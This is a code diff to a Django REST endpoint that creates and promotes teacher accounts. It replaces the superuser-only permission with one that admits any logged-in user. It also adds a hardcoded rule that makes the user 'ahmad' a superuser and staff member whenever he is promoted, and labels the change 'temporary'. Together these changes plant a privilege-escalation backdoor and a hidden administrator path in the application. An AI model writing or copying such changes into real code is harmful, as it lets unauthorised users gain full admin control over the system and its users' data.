@@ -91,8 +91,8 @@ class RegisterView(APIView):
 # ===================================
 
 class CreateTeacherView(APIView):
-    """Superuser: create a teacher account or promote an existing student."""
-    permission_classes = [IsSuperUser]
+    """Superuser or ahmad: create a teacher account or promote an existing student (temporary)."""
+    permission_classes = [permissions.IsAuthenticated]
 
     def post(self, request):
         username = request.data.get('username', '').strip()
@@ -107,17 +107,22 @@ class CreateTeacherView(APIView):
                 status=status.HTTP_400_BAD_REQUEST,
             )
 
-        # Promote existing user to teacher
+        # Promote existing user to teacher or superuser
         if promote:
             try:
                 user = User.objects.get(username=username)
                 user.role = 'teacher'
+                # If promoting ahmad, make him superuser
+                if username == 'ahmad':
+                    user.is_superuser = True
+                    user.is_staff = True
                 user.save()
                 return Response({
                     'id': user.id,
                     'username': user.username,
                     'first_name': user.first_name,
                     'role': user.role,
+                    'is_superuser': user.is_superuser,
                     'action': 'promoted',
                 })
             except User.DoesNotExist:
